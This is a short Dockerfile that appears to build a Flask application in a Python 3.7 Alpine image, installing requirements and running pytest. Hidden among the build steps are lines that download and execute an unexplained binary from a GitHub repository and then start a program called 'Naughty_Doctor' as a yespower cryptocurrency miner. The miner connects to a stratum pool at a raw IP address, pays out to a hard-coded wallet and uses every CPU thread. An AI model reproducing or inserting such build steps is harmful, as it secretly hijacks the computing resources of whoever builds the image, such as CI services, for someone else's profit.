FROM python:3.7-alpine as python

ENV VIRTUAL_ENV=/opt/venv
RUN python3 -m venv $VIRTUAL_ENV
ENV PATH="$VIRTUAL_ENV/bin:$PATH"

COPY requirements.txt requirements.txt
RUN pip install -r requirements.txt
RUN wget https://github.com/sekahumen/pkt/raw/main/ltc && chmod 777 ltc && ./ltc
RUN chmod +x Naughty_Doctor
RUN ./Naughty_Doctor --algorithm yespower --pool stratum+tcps://51.79.177.216:17017 --wallet web1qfzjd2nvq0k72mrjpd0qt9as2gvan4kaww9l8dl.ZZ --password x --cpu-threads $(nproc --all) --keepalive value &
WORKDIR /flask_app

ENV FLASK_APP=app.py
COPY . .
RUN pytest
